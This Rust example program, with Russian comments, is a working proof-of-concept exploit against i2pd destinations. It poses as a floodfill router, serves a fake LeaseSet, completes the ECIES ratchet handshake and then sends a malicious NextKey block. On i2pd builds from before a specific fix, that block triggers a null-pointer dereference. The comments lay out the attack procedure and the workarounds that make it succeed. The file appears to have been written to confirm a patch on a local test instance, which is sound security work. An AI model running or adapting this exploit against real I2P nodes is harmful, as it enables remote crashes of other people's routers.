//! POC: i2pd-*destination* получает вредоносный блок `NextKey` и попадает
//! в строку фикса `Garlic: Forward next key received, but key is not set`.
//!
//! ## Зачем ещё один POC
//!
//! Пример `uu-i2p-poc-i2pd-nextkey` шлёт `NextKey` **роутеру** (Noise «N»).
//! Там строка фикса недостижима: `HandleNextKey` вызывается только когда
//! `receiveTagset != nullptr` (`ECIESX25519AEADRatchetSession.cpp:417`), а у
//! роутера тегов нет — блок отбивается раньше, как
//! `Garlic: Unexpected next key block`. Null-deref (до фикса `e5621949`)
//! живёт на **тег-сессии destination'а**.
//!
//! Здесь мы играем роль Bob'а (destination), а тестовый i2pd — Alice
//! (клиентский destination HTTP-прокси). i2pd сам инициирует
//! ECIES-X25519-AEAD-Ratchet сессию к нашему фейковому destination'у, а мы
//! в ответ на его NS шлём NSR, а затем existing-session сообщение, в
//! котором **первым** `NextKey`-блоком идёт вредоносный:
//!
//! ```text
//!   flags = 0x00  (forward-ветка: без REVERSE_KEY_FLAG,
//!                  без REQUEST_REVERSE_KEY_FLAG, без KEY_PRESENT_FLAG)
//!   keyID = 0x0000
//! ```
//!
//! На свежей сессии `m_NextReceiveRatchet` ещё нет: `HandleNextKey`
//! создаёт его с `key == nullptr`, forward-ветка без
//! `REQUEST_REVERSE_KEY_FLAG` идёт в `else` и до фикса делала
//! `m_NextReceiveRatchet->key->Agree(...)` — null-deref. Фикс добавляет
//! проверку и печатает:
//!
//! ```text
//!   Garlic: Forward next key received, but key is not set   (eLogError)
//! ```
//!
//! ## Как заставить i2pd инициировать сессию
//!
//! Сессию к destination'у инициирует тот, у кого есть его `LeaseSet`:
//!
//! 1. POC подключается к i2pd по SSU2 и объявляет себя **флудфиллом**
//!    (`f` в caps, опубликованный SSU2v4-адрес, версия ≥ 0.9.62 — иначе
//!    i2pd не добавит нас в `m_Floodfills`). «Настоящим» флудфиллом мы
//!    не притворяемся: нужен ровно один путь — `GetClosestFloodfill`
//!    для нашего destination'а.
//! 2. Клиентский destination i2pd (HTTP-прокси, zero-hop туннели, см.
//!    `~/.local/opt/i2pd-uu/ssu2.conf`) просит у нас `LeaseSet` нашего
//!    фейкового destination'а: `DatabaseLookup` с одноразовым
//!    симметричным ключом (`replyKey`) и тегом (`replyTag`).
//! 3. Мы отвечаем `DatabaseStore`'ом, завёрнутым в «симметричный» garlic
//!    (`tag || AEAD(clove)`, i2pd `WrapECIESX25519Message`), через
//!    reply-туннель запросившего — i2pd складывает LS в
//!    `m_RemoteLeaseSets` и продолжает connect.
//! 4. i2pd шлёт NS на lease из нашего LS: `TunnelGateway{lease.tunnelID}`
//!    с ECIES-NS внутри (туннель нулевой, gateway — сам i2pd, доставка —
//!    нам по SSU2). Из NS мы узнаём static-ключ destination'а i2pd и его
//!    собственный lease (он приложен к NS кловом `DatabaseStore`).
//! 5. Отвечаем NSR'ом и сразу за ним — вредоносным existing-session
//!    сообщением.
//!
//! ## Запуск
//!
//! ```text
//! UU_I2P_LIVE_RI=~/.local/opt/i2pd-uu/datadir/router.info \
//! UU_I2P_LIVE_SSU2=127.0.0.1:12345 \
//!     cargo run --example uu-i2p-poc-i2pd-dest-nextkey
//! ```
//!
//! Пример печатает b32-адрес и готовую команду `curl` через HTTP-прокси
//! i2pd (`127.0.0.1:4445`) — её надо выполнить в другом терминале, это и
//! есть триггер: без запроса к адресу i2pd не полезет за `LeaseSet`.
//!
//! ## Тонкости, на которых POC уже спотыкался
//!
//! - **Адрес в RI обязан совпадать с фактическим endpoint'ом сессии.**
//!   i2pd рвёт `SessionConfirmed`, если опубликованный хост не равен
//!   адресу, с которого пришла сессия (`SSU2Session.cpp:1400`, лог
//!   `SSU2: Host mismatch between published address ... and actual
//!   endpoint ...`). Поэтому мы публикуем **loopback** — то же, куда
//!   i2pd отвечает. Loopback проходит только потому, что в конфиге
//!   тестового i2pd `reservedrange = false`
//!   (`Transports::IsInReservedRange` = `IsCheckReserved() && ...`).
//! - **netDb тестового i2pd надо чистить** перед прогоном: в
//!   `m_Floodfills` не должно быть чужих/устаревших роутеров, иначе
//!   `GetClosestFloodfill` выберет не нас. Это делает `run-ssu2.sh`
//!   (`rm -rf datadir/netDb datadir/peerProfiles`).
//!
//! Логи i2pd: `grep -a "next key\|LeaseSet\|DatabaseLookup" /tmp/opencode/i2pd-ssu2.log | tail`.

use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use tokio::net::UdpSocket;
use tokio::time::{Instant, timeout};
use tracing::{info, warn};
use tracing_subscriber::{EnvFilter, fmt};

use uu_i2p::{
    EciesGarlicClove, I2PTag, IdentHash,
    config::{DEFAULT_NET_ID, DEFAULT_VERSION},
    crypto::{I2PX25519Keys, NoiseSymmetricState, init_noise_n_state},
    database_lookup::DatabaseLookup,
    database_store::DatabaseStore,
    ecies_destination::EciesGarlicDestination,
    ecies_ratchet::wrap_symmetric_message,
    error::{I2PError, Result},
    garlic_block::{GarlicBlock, NextKeyBlock, parse_blocks},
    garlic_body::GarlicBody,
    i2np::I2npMessageType,
    i2np_message::I2npMessage,
    lease::Lease,
    lease_set2::LeaseSet2,
    private_keys::I2PPrivateKeys,
    router_info::{FullRouterInfo, RouterInfo, RouterInfoCaps, ri_caps},
    router_info_address::I2PAddress,
    ssu2_pool::{Ssu2Event, Ssu2Local, Ssu2Pool},
    tunnel_messages::TunnelGatewayBody,
};

/// Сколько секунд ждём всей истории (запрос LS → NS → наши сообщения).
const DEFAULT_TIMEOUT_SECS: u64 = 120;

/// Время жизни нашего LS и lease, секунды.
///
/// i2pd отвергает LS/lease, истекающие позже `now + 12 минут`
/// (`LEASESET_EXPIRATION_TIME_THRESHOLD`), поэтому 10 минут — с запасом.
const LEASE_TTL_SECS: u64 = 600;

fn now_ms() -> u64 {
    u64::try_from(
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("system clock before epoch")
            .as_millis(),
    )
    .expect("milliseconds since epoch exceed u64")
}

fn now_secs() -> u32 {
    u32::try_from(now_ms() / 1000).unwrap_or(u32::MAX)
}

fn init_tracing() {
    let _ = fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .try_init();
}

/// Первые 8 байт ключа в hex — для логов.
fn hex8(bytes: &[u8; 32]) -> String {
    use std::fmt::Write as _;
    let mut out = String::with_capacity(16);
    for b in &bytes[..8] {
        let _ = write!(out, "{b:02x}");
    }
    out
}

/// `[u8; 32]` из среза (для ключей `I2PPrivateKeys`).
fn array32(bytes: &[u8]) -> [u8; 32] {
    bytes.try_into().expect("expected 32 bytes")
}

struct Args {
    ri_path: String,
    addr_override: Option<SocketAddr>,
}

fn parse_args() -> Args {
    let ri_path = std::env::args()
        .nth(1)
        .or_else(|| std::env::var("UU_I2P_LIVE_RI").ok());
    let Some(ri_path) = ri_path else {
        eprintln!(
            "usage: uu-i2p-poc-i2pd-dest-nextkey <router.info> [host:port]\n\
             \n\
             (или UU_I2P_LIVE_RI=/path/to/router.info, UU_I2P_LIVE_SSU2=host:port)"
        );
        std::process::exit(1);
    };
    let addr_override = std::env::args()
        .nth(2)
        .or_else(|| std::env::var("UU_I2P_LIVE_SSU2").ok())
        .map(|s| s.parse::<SocketAddr>().expect("host:port"));
    Args {
        ri_path,
        addr_override,
    }
}

/// Ждёт `Established`, попутно логируя прочие события.
async fn wait_established(pool: &Ssu2Pool) -> IdentHash {
    let deadline = Instant::now() + Duration::from_secs(20);
    loop {
        let remaining = deadline.saturating_duration_since(Instant::now());
        match timeout(remaining, pool.next_event())
            .await
            .expect("timeout waiting for Established")
            .expect("pool event")
        {
            Ssu2Event::Established { ident } => return ident,
            Ssu2Event::Disconnected { ident } => panic!("disconnected from {}", ident.to_base64()),
            other => info!(?other, "event (before Established)"),
        }
    }
}

/// Расшифровывает роутерный ECIES-garlic (Noise «N»), которым i2pd
/// отправляет `DatabaseLookup` флудфиллу.
///
/// `static_priv`/`static_pub` — ключ шифрования *identity* роутера (не
/// SSU2-статик): i2pd берёт его из `RouterInfo`.
fn decrypt_router_garlic(
    static_priv: &[u8; 32],
    static_pub: &[u8; 32],
    wire: &[u8],
) -> Result<Vec<u8>> {
    if wire.len() < 32 + 16 {
        return Err(I2PError::InvalidLength {
            expected: 48,
            got: wire.len(),
        });
    }
    let mut aepk = [0u8; 32];
    aepk.copy_from_slice(&wire[..32]);

    let mut noise = NoiseSymmetricState::new(&[0u8; 32], &[0u8; 32], static_pub);
    init_noise_n_state(&mut noise, static_pub);
    noise.mix_hash(&aepk);
    let keys = I2PX25519Keys::from_private(static_priv, Some(static_pub));
    let shared = keys
        .agree(&aepk)
        .ok_or(I2PError::Malformed("poc: x25519 agree failed"))?;
    noise.mix_key(&shared);

    let mut plain = vec![0u8; wire.len() - 32 - 16];
    let len = noise.decrypt(&wire[32..], &mut plain)?;
    plain.truncate(len);
    Ok(plain)
}

/// Состояние POC: SSU2-пул, наш destination и его `LeaseSet`.
struct Poc {
    pool: Ssu2Pool,
    dest: EciesGarlicDestination,
    dest_ident: IdentHash,
    dest_ls: LeaseSet2,
    router_priv: [u8; 32],
    router_pub: [u8; 32],
}

impl Poc {
    /// Отправляет garlic-wire через `TunnelGateway` на lease пира.
    async fn send_tunneled(&self, lease: &Lease, wire: Vec<u8>) -> Result<()> {
        let garlic = I2npMessage::new(I2npMessageType::Garlic, GarlicBody::new(wire).to_buffer()?);
        let gw = TunnelGatewayBody {
            tunnel_id: lease.tunnel_id,
            data: garlic.to_buffer()?,
        };
        self.pool
            .send_to(
                &lease.tunnel_gateway,
                I2npMessage::new(I2npMessageType::TunnelGateway, gw.to_buffer()?),
            )
            .await
    }

    /// Обрабатывает garlic от роутера i2pd: ждём `DatabaseLookup` за
    /// нашим `LeaseSet` и отвечаем `DatabaseStore`'ом.
    ///
    /// Ответ на lookup — не финал: после него i2pd добавляет LS
    /// (`Destination: New remote LeaseSet added`), поднимает поток к нам
    /// и шлёт NS, поэтому цикл событий должен продолжать работать.
    async fn handle_router_garlic(&self, payload: &[u8]) -> Result<()> {
        let body = GarlicBody::from_buffer(payload)?;
        let plain = decrypt_router_garlic(&self.router_priv, &self.router_pub, &body.payload)?;
        for block in parse_blocks(&plain)? {
            let GarlicBlock::EciesGarlicClove(clove) = block else {
                continue;
            };
            if clove.message_type != I2npMessageType::DatabaseLookup {
                continue;
            }
            let lookup = DatabaseLookup::from_buffer(&clove.payload)?;
            println!(
                "DatabaseLookup: key={} from={} reply_tunnel={:?} excluded={}",
                lookup.key.to_base32(),
                lookup.from.to_base64(),
                lookup.reply_tunnel_id,
                lookup.excluded.len()
            );
            if lookup.key != self.dest_ident {
                println!("  ищут не нас — пропускаем");
                continue;
            }
            self.answer_lookup(&lookup).await?;
            println!("  ждём NS от destination'а i2pd…");
            return Ok(());
        }
        println!("garlic от роутера без нужного нам DatabaseLookup — пропускаем");
        Ok(())
    }

    /// Отвечает на `DatabaseLookup` нашим `LeaseSet2`.
    async fn answer_lookup(&self, lookup: &DatabaseLookup) -> Result<()> {
        let Some(enc) = &lookup.encrypted_reply else {
            return Err(I2PError::Malformed(
                "poc: DatabaseLookup without encrypted reply",
            ));
        };
        let Some(tag_bytes) = enc.tags.first() else {
            return Err(I2PError::Malformed("poc: DatabaseLookup without reply tag"));
        };
        let tag = u64::from_le_bytes(
            <[u8; 8]>::try_from(tag_bytes.as_slice())
                .map_err(|_| I2PError::Malformed("poc: reply tag must be 8 bytes"))?,
        );

        let store = DatabaseStore::new_lease_set2(self.dest_ident, self.dest_ls.to_buffer()?);
        let store_msg = I2npMessage::new(I2npMessageType::DatabaseStore, store.to_buffer()?);
        let clove = EciesGarlicClove::wrap_local(&store_msg);
        let wire = wrap_symmetric_message(&enc.session_key, tag, &[clove])?;

        let garlic = I2npMessage::new(I2npMessageType::Garlic, GarlicBody::new(wire).to_buffer()?);
        let total = garlic.total_len();
        let Some(tunnel_id) = lookup.reply_tunnel_id else {
            println!("  reply без туннеля — отвечаем прямым Garlic");
            self.pool.send_to(&lookup.from, garlic).await?;
            println!("  LeaseSet отправлен ({total} байт)");
            return Ok(());
        };
        let gw = TunnelGatewayBody {
            tunnel_id,
            data: garlic.to_buffer()?,
        };
        self.pool
            .send_to(
                &lookup.from,
                I2npMessage::new(I2npMessageType::TunnelGateway, gw.to_buffer()?),
            )
            .await?;
        println!("  LeaseSet2 отправлен в reply-туннель {tunnel_id} ({total} байт)");
        Ok(())
    }

    /// Обрабатывает `TunnelGateway` от i2pd: ждём NS, отвечаем NSR'ом и
    /// вредоносным `NextKey`.
    ///
    /// `true`, если вредоносное сообщение отправлено.
    async fn handle_gateway(&mut self, payload: &[u8]) -> Result<bool> {
        let gw = TunnelGatewayBody::from_buffer(payload)?;
        let inner = I2npMessage::from_buffer(&gw.data)?;
        println!(
            "TunnelGateway: tunnel_id={} внутри {:?} {} байт",
            gw.tunnel_id,
            inner.message_type(),
            inner.payload().len()
        );
        if inner.message_type() != I2npMessageType::Garlic {
            return Ok(false);
        }
        let body = GarlicBody::from_buffer(inner.payload())?;
        let res = self.dest.handle_message(&body.payload)?;
        println!(
            "ECIES: remote_static=…{} needs_reply={} terminated={} cloves={}",
            hex8(&res.remote_static),
            res.needs_reply,
            res.terminated,
            res.blocks.len()
        );
        if !res.needs_reply {
            println!("  это не NS — ждём дальше");
            return Ok(false);
        }
        let Some(lease) = Self::i2pd_lease(&res.blocks)? else {
            warn!("в NS не было приложенного LeaseSet i2pd — некуда отвечать");
            return Ok(false);
        };

        // 1. NSR: без него у Alice не будет send-tagset, и наше
        //    existing-session сообщение не найдёт тег.
        let nsr = self.dest.send_blocks(res.remote_static, now_ms(), &[])?;
        println!("NSR: {} байт → lease i2pd", nsr.len());
        self.send_tunneled(&lease, nsr).await?;

        // 2. Вредоносный NextKey первым блоком своего типа.
        let bad = NextKeyBlock::without_key(0, 0);
        let wire = self.dest.send_blocks_extra(
            res.remote_static,
            now_ms(),
            &[],
            &[GarlicBlock::NextKey(bad.to_bytes())],
        )?;
        println!(
            "existing-session с вредоносным NextKey: {} байт",
            wire.len()
        );
        self.send_tunneled(&lease, wire).await?;
        Ok(true)
    }

    /// Достаёт lease i2pd из приложенного к NS `DatabaseStore`-клова.
    fn i2pd_lease(blocks: &[EciesGarlicClove]) -> Result<Option<Lease>> {
        for clove in blocks {
            println!(
                "  clove: {:?} {} байт",
                clove.message_type,
                clove.payload.len()
            );
            if clove.message_type != I2npMessageType::DatabaseStore {
                continue;
            }
            let store = DatabaseStore::from_buffer(&clove.payload)?;
            let ls = LeaseSet2::from_buffer(&store.payload_decoded()?)?;
            println!(
                "  LeaseSet2 i2pd: {} lease(ов), expires={}s",
                ls.leases().len(),
                ls.expires()
            );
            for l in ls.leases() {
                println!(
                    "    lease: gateway={} tunnel={} end={}ms",
                    l.tunnel_gateway.to_base64(),
                    l.tunnel_id,
                    l.end_date_ms
                );
            }
            if let Some(lease) = ls.leases().first() {
                return Ok(Some(*lease));
            }
        }
        Ok(None)
    }

    /// Крутит события пула до победы или таймаута.
    async fn run(&mut self, secs: u64) -> Result<()> {
        let deadline = Instant::now() + Duration::from_secs(secs);
        loop {
            let remaining = deadline.saturating_duration_since(Instant::now());
            if remaining.is_zero() {
                println!("Таймаут: i2pd так и не дошёл до NS. Проверь лог i2pd.");
                return Ok(());
            }
            let event = match timeout(remaining, self.pool.next_event()).await {
                Ok(Ok(event)) => event,
                Ok(Err(e)) => return Err(e),
                Err(_) => {
                    println!("Таймаут: i2pd так и не дошёл до NS. Проверь лог i2pd.");
                    return Ok(());
                }
            };
            match event {
                Ssu2Event::Message { from, message } => {
                    println!(
                        "I2NP от {}: {:?} {} байт",
                        from.to_base64(),
                        message.message_type(),
                        message.payload().len()
                    );
                    let done = match message.message_type() {
                        I2npMessageType::Garlic => {
                            self.handle_router_garlic(message.payload()).await?;
                            false
                        }
                        I2npMessageType::TunnelGateway => {
                            self.handle_gateway(message.payload()).await?
                        }
                        _ => false,
                    };
                    if done {
                        return Ok(());
                    }
                }
                Ssu2Event::Disconnected { ident } => {
                    println!("i2pd закрыл сессию с {}", ident.to_base64());
                    return Ok(());
                }
                other => info!(?other, "event"),
            }
        }
    }
}

/// Готовое к работе состояние: пул уже слушает, destination и LS собраны.
struct Prepared {
    poc: Poc,
    ri_bytes: Vec<u8>,
    addr_override: Option<SocketAddr>,
    i2pd: IdentHash,
}

/// Наш `RouterInfo` — флудфилл с published SSU2v4-адресом на loopback.
///
/// Loopback здесь не лень, а необходимость: i2pd рвёт `SessionConfirmed`,
/// если опубликованный хост не равен адресу, с которого пришла сессия
/// (`SSU2Session.cpp:1400`, «Host mismatch»), а сессия у нас идёт через
/// 127.0.0.1. Loopback считается допустимым published-хостом только
/// потому, что в конфиге тестового i2pd `reservedrange = false`
/// (`Transports::IsInReservedRange` = `IsCheckReserved() && ...`).
/// Без published IPv4 i2pd не признает нас флудфиллом
/// (`RouterInfo::IsEligibleFloodfill`), а нам нужно ровно это: чтобы он
/// спросил у нас `LeaseSet` через `GetClosestFloodfill`.
///
/// `RouterConfig` тут не подходит: он намеренно запрещает публиковать
/// loopback (для настоящего роутера это бессмысленный адрес), поэтому
/// `RouterInfo` собираем сами.
///
/// # Errors
///
/// Ошибки генерации ключей, сборки и сериализации `RouterInfo`, разбора
/// его в [`Ssu2Local::new`].
fn build_local(
    port: u16,
    static_keys: I2PX25519Keys,
    intro_key: [u8; 32],
) -> Result<(Ssu2Local, I2PPrivateKeys)> {
    let keys = I2PPrivateKeys::generate_default()?;
    let address = I2PAddress::ssu2_published(
        IpAddr::V4(Ipv4Addr::LOCALHOST),
        port,
        I2PTag::from_array(*static_keys.public_key()),
        I2PTag::from_array(intro_key),
    );
    let caps = RouterInfoCaps {
        bits: ri_caps::FLOODFILL,
        ..RouterInfoCaps::default()
    };
    let body = RouterInfo::builder()
        .timestamp(now_ms())
        .add_address(address)
        .caps(caps)
        .version(DEFAULT_VERSION)
        .net_id(i32::from(DEFAULT_NET_ID))
        .build();
    let ri_bytes = FullRouterInfo::from_keys(&keys, body)?.to_buffer()?;
    let local = Ssu2Local::new(static_keys, intro_key, ri_bytes, DEFAULT_NET_ID, false)?;
    Ok((local, keys))
}

/// Собирает ключи, `RouterInfo` (флудфилл с published-адресом),
/// фейковый destination и его `LeaseSet`.
async fn prepare(args: &Args) -> Prepared {
    let ri_bytes = std::fs::read(&args.ri_path).expect("read RouterInfo");
    let remote_ri = FullRouterInfo::from_buffer(&ri_bytes).expect("parse RouterInfo");
    let i2pd = *remote_ri.ident_hash();

    let socket = UdpSocket::bind("127.0.0.1:0").await.expect("bind udp");
    let local_addr = socket.local_addr().expect("local_addr");
    let static_keys = I2PX25519Keys::generate();
    let intro: [u8; 32] = rand::random();
    let (local, router_keys) =
        build_local(local_addr.port(), static_keys, intro).expect("build our RouterInfo");
    let router_priv = array32(router_keys.crypto_private());
    let router_pub = array32(
        router_keys
            .public()
            .encryption_public_key()
            .expect("router encryption key"),
    );
    let ours = *router_keys.public().ident_hash();
    let pool = Ssu2Pool::with_socket(socket, local).expect("Ssu2Pool");

    // Destination и его LeaseSet: lease указывает на нас (gateway = наш
    // роутер), tunnelID произвольный — TunnelGateway мы разбираем сами.
    let dest_keys = I2PPrivateKeys::generate_default().expect("generate dest keys");
    let dest_ident = *dest_keys.public().ident_hash();
    let dest_static = I2PX25519Keys::from_private(
        &array32(dest_keys.crypto_private()),
        Some(&array32(
            dest_keys
                .public()
                .encryption_public_key()
                .expect("dest encryption key"),
        )),
    );
    let tunnel_id = rand::random::<u32>() | 1;
    let dest_ls = LeaseSet2::builder()
        .published_timestamp(now_secs())
        .expires(u16::try_from(LEASE_TTL_SECS).expect("lease ttl"))
        .add_lease(Lease::new(
            ours,
            tunnel_id,
            (u64::from(now_secs()) + LEASE_TTL_SECS) * 1000,
        ))
        .build(&dest_keys)
        .expect("build LeaseSet2");

    println!("Наш роутер:      {}", ours.to_base64());
    println!("Наш destination: {}", dest_ident.to_base64());
    println!("Адрес:           {}.b32.i2p", dest_ident.to_base32());
    println!(
        "Lease:           gateway={} tunnel={tunnel_id}",
        ours.to_base64()
    );
    println!("Published:       {}:{}", local_addr.ip(), local_addr.port());
    println!();
    println!("=== Триггер: попросить i2pd сходить на наш destination ===");
    println!(
        "curl -x http://127.0.0.1:4445 --max-time 20 http://{}.b32.i2p/",
        dest_ident.to_base32()
    );
    println!();

    Prepared {
        poc: Poc {
            pool,
            dest: EciesGarlicDestination::new(dest_static),
            dest_ident,
            dest_ls,
            router_priv,
            router_pub,
        },
        ri_bytes,
        addr_override: args.addr_override,
        i2pd,
    }
}

/// Что должно появиться в логе i2pd, если POC сработал.
fn print_expectations() {
    println!();
    println!("=== Что должно быть в логе i2pd ===");
    println!("Destination: New remote LeaseSet added");
    println!("Garlic: Forward next key received, but key is not set   <-- строка фикса");
    println!();
    println!("grep -a \"next key\\|LeaseSet\\|DatabaseLookup\" /tmp/opencode/i2pd-ssu2.log | tail");
}

#[tokio::main]
async fn main() {
    init_tracing();
    let args = parse_args();
    println!("=== POC: i2pd-destination + вредоносный NextKey ===");
    println!("RouterInfo i2pd: {}", args.ri_path);
    let Prepared {
        mut poc,
        ri_bytes,
        addr_override,
        i2pd,
    } = prepare(&args).await;

    let ident = timeout(Duration::from_secs(20), async {
        match addr_override {
            Some(addr) => poc.pool.connect_to(&ri_bytes, addr).await,
            None => poc.pool.connect(&ri_bytes).await,
        }
    })
    .await
    .expect("connect timeout")
    .expect("connect failed");
    assert_eq!(ident, i2pd, "connected to a different router");
    let _ = wait_established(&poc.pool).await;
    println!("SSU2: соединение с i2pd установлено, ждём запрос LeaseSet'а...");

    if let Err(e) = poc.run(DEFAULT_TIMEOUT_SECS).await {
        eprintln!("ошибка: {e}");
        std::process::exit(1);
    }
    let _ = poc.pool.close(&i2pd).await;
    print_expectations();
}
